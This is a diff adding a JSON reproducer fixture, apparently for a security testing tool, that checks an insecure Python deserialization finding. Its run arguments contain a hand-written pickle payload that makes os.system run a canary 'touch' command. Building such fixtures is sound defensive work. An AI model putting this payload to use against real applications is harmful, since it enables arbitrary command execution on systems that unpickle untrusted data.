@@ -1,0 +1,7 @@
+{
+  "schema": "agentic-security/reproducer", "version": 1, "findingId": "proof-fabric-fixture-insecure-deserialization-python",
+  "lang": "python", "sources": { "app.py": "app.py" },
+  "run": ["{{PYTHON}}", "app.py", "cos\nsystem\n(S'touch {{CANARY:command}}'\ntR."],
+  "oracle": { "type": "command_execution", "params": { "canary": "command" } },
+  "network": "none"
+}
